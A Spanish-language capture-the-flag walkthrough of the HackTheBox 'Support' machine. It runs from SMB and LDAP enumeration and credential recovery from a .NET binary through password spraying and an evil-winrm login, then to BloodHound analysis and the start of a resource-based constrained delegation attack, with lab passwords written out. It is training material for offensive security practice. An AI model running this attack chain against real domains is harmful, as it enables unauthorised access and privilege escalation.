

# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.230.181 -oG allPorts
```

```shell
[*] IP Address: 10.129.230.181
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49703,49741
```

```shell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49703,49741 -sCV 10.129.230.181 -oN targeted
```


```shell
nxc smb 10.129.230.181
```

```ad-info
support.htb
```

## Enumeración de recursos compartidos

```shell
smbclient -L 10.129.230.181 -N
```

```shell
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share 
```


```shell
smbmap -H 10.129.230.181 -u none
```

```shell
Disk                                  Permissions     Comment
----                                  -----------     -------
ADMIN$                                NO ACCESS       Remote Admin
C$                                    NO ACCESS       Default share
IPC$                                  READ ONLY       Remote IPC
NETLOGON                              NO ACCESS       Logon server share 
support-tools                         READ ONLY       support staff tools
SYSVOL                                NO ACCESS       Logon server share 
```

```shell
smbmap -H 10.129.230.181 -u none -r support-tools
```

```ad-info
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe

```

### Acceso al recurso compartido

```shell
smbclient //10.129.230.181/support-tools -N
```

```shell
get UserInfo.exe.zip
```

Listaremos el contenido del comprimido
```shell
7z l UserInfo.exe.zip
```

Lo descomprimimos
```shell
unzip UserInfo.exe.zip
```

```shell
cat UserInfo.exe.config
```

Leemos el contenido del otro fichero
```shell
strings -e l UserInfo.exe
```

Encontramos un usuario llamado `ldap`
Lo validamos
```shell
kerbrute userenum --dc 10.129.230.181 -d support.htb users
```



## Enumeración de Usuarios

```shell
kerbrute userenum --dc 10.129.230.181 -d support.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Encontramos los usuarios
```ad-info
support
guest
administrator
ldap
```

### AS-REP Roasting
Este ataque se produce cuando se tiene una lista de usuarios validos

```shell
impacket-GetNPUsers -no-pass -usersfile users support.htb/
```

Ningún usuario es vulnerable

## Enumeración de binarios .exe
Como anteriormente hemos identificado un binario llamado `UserInfo.exe` vamos a compartírnoslo para ver su funcionalidad, compartiéndonos el archivo `.zip` a la maquina Windows a través de un servidor con `python`

Una vez descargado el archivo y descomprimido nos abrimos una terminal en la ruta de la carpeta

Ejecutamos el programa `UserInfo.exe`, encontrándonos un panel de ayuda

Nos tendremos que compartir también la VPN de HackTheBox para poder ejecutar la herramienta

Deberemos añadir la IP y el nombre de Host de la maquina para que nos reconozca la herramienta y no nos indique que el servidor no es funcional

Abrimos el documento de los `host` de Windows con el bloc de notas como administrador, este fichero de configuración se encuentra en `C:\Windows\System32\drivers\etc\hosts`

Pudiendo así ahora ejecutar el binario `.exe` es un programa que nos permite enumerar información sobre usuarios.
Permitiéndonos enumerar usuarios usando `.\UserInfo.exe find -first * -last *`

```shell
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria
```

Nos descargaremos la herramienta [[DNSPY]], el cual nos dejara leer el binario `.exe`
Encontrando una contraseña
```ad-hint
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

Esta se encuentra codificada, así que lo que podemos hacer es introducir un `Break Point` en el punto en el que se procesa la contraseña en texto claro y poder leerla

Obteniendo la contraseña ahora
```ad-info
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Ahora vamos a intentar enumerar todo el servicio de `LDAP` ya que el usuario que corresponde la contraseña es `ldap`
Validamos al usuario con [[NETEXEC]]
```shell
nxc smb 10.129.230.181 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Una vez con estas credenciales validas podemos enumerar los usuarios accediendo desde [[RPCCLIENT]]
```shell
rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.230.181
```

- Enumeración de usuarios `enumdomusers`
- Enumeración de grupos `enumdomgroups`

Nos crearemos con una expresión regular una lista con todos los usuarios que existen
```shell
rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.230.181 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users
```

### Password Sparaying
Usaremos [[NETCAT]] para validar si hay reutilización de contraseñas
```shell
nxc smb 10.129.230.181 -u users -p passwords --continue-on-success
```

Sin encontrar ninguna correspondencia

## Enumeración LDAP

Enumeraremos el servicio usando [[LDAPSEARCH]]
```shell
ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

Como anteriormente encontramos un usuario llamado `support` vamos a enumerarlo usando 
```shell
ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i "samaccountname: support" -B 40
```

Encontrando un campo llamado `info` en el cual hay un valor semejante a una contraseña 
```ad-hint
Ironside47pleasure40Watchful
```

La validamos con [[NETEXEC]] tomándola como valida
```shell
nxc smb 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```

Verificamos si el usuario pertenece al grupo de `Remote Management Users` usando la herramienta [[NETEXEC]]
```shell
nxc winrm 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```

Viendo que si pertenece y pudiéndonos conectar al usuario usando la herramienta [[EVIL-WINRM]]
```shell
evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```

Al enumerar los grupos encontramos uno llamado `Shared Support Accounts`
# Escalada de privilegios
### BloodHound

Usaremos la herramienta de [[BLOODHOUND]] para extraer toda la información posible de la maquina y poder analizarlo gráficamente los pasos que deberemos de realizar para la escalada de privilegios
```shell
bloodhound-python -d support.htb -ns 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' -c ALL --zip
```

Buscaremos por el grupo encontrado anteriormente y en `Outbound Object Control` encontraremos que tenemos permisos `GenericAll` sobre el `DC.SUPPORT.HTB`
![[Pasted image 20260302115937.png]]


SI hacemos clic sobre el privilegio podemos ver como se realizaría la escalada pudiendo explotar
### Resource-Based Constrained Delegation Attack (RBCD)
Este ataque se basa en obtener un `Service Ticket` para ganar acceso aprovechándose de `Kerberos` impresionando a un usuario
Usaremos una herramienta llamada [[RBCD]] de GitHub `https://github.com/tothi/rbcd-attack`

Pero también lo podemos hacer manualmente siguiendo los pasos que nos indica `https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html`

Obteniendo primero la herramienta [[POWERMAD]] y subiéndola a la maquina victima
```sehll
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
```

En la maquina victima lo subimos usando 
```shell
upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/Support/content/Powermad.ps1
```

Lo importamos para que sea interpretado
```shell
Import-Module .\Powermad.ps1
```

